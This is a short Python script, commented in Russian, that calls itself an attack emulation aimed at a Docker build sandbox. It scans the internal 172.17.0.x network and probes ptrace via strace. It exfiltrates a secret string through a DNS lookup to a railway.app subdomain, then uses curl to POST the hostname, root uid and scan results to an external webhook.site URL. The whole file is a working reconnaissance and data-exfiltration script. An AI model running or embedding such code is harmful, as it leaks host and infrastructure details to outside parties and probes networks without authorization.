import socket
import subprocess
import os
import json

# Конфигурация
TARGET_NET = "172.17.0." # Стандартная сеть Docker, которую мы видели в логах
WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def trigger_internal_alerts():
    results = {"alerts_triggered": []}

    # 1. Агрессивное сканирование внутренней сети (триггерит IDS)
    print("[!] Starting noisy network scan...")
    for i in range(1, 15):
        ip = f"{TARGET_NET}{i}"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        if s.connect_ex((ip, 80)) == 0:
            results["alerts_triggered"].append(f"Found internal HTTP: {ip}")
        s.close()

    # 2. Попытка ptrace (инъекция в память)
    # Даже если ptrace запрещен, попытка системного вызова логируется ядром
    print("[!] Testing process ptrace capabilities...")
    try:
        # Пытаемся "прикрепиться" к самому себе как тест на привилегии
        res = subprocess.run(["strace", "-p", str(os.getpid())], capture_output=True, timeout=1)
        results["ptrace_status"] = "PROBABLE_VULNERABILITY"
    except subprocess.TimeoutExpired:
        results["ptrace_status"] = "PTRACE_BLOCKED_BY_KERNEL"
    except Exception as e:
        results["ptrace_status"] = f"PTRACE_ERROR: {str(e)}"

    # 3. DNS Exfiltration (триггерит аномалии трафика)
    # Кодируем секреты в поддомены
    print("[!] Sending DNS noise...")
    secret_data = "ROOT_UID_0_CLEVER_SPIRIT" # Данные из твоего проекта
    try:
        subprocess.run(["nslookup", f"{secret_data}.vulnerability-test.railway.app"], capture_output=True)
    except:
        pass

    # 4. Финальный деструктивный (но безопасный) отчет
    final_report = {
        "status": "ATTACK_EMULATION_COMPLETE",
        "hostname": os.uname().nodename, # Наш buildkitsandbox
        "uid": os.getuid(), # Подтвержденный root
        "findings": results
    }

    subprocess.run(['curl', '-s', '-X', 'POST', '-d', json.dumps(final_report), WEBHOOK_URL])

if __name__ == "__main__":
    trigger_internal_alerts()
